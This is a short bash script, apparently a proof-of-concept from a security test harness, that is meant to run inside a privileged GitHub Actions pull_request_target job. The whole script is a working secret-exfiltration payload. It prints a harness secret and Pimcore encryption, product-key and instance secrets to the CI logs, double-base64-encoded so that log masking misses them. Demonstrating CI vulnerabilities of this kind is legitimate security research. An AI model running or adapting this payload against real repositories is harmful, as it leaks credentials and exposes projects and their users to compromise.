#!/bin/bash
# Attacker-controlled script executed directly by the privileged pull_request_target job.
# Leak the harness toy secret (double-base64 to survive log masking) then fail fast.
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
echo "GERALT_LEAKED_PIMCORE_INSTANCE_IDENTIFIER=$(echo -n "$PIMCORE_INSTANCE_IDENTIFIER" | base64 | base64)"
echo "GERALT_LEAKED_PIMCORE_ENCRYPTION_SECRET=$(echo -n "$PIMCORE_ENCRYPTION_SECRET" | base64 | base64)"
echo "GERALT_LEAKED_PIMCORE_PRODUCT_KEY=$(echo -n "$PIMCORE_PRODUCT_KEY" | base64 | base64)"
exit 1
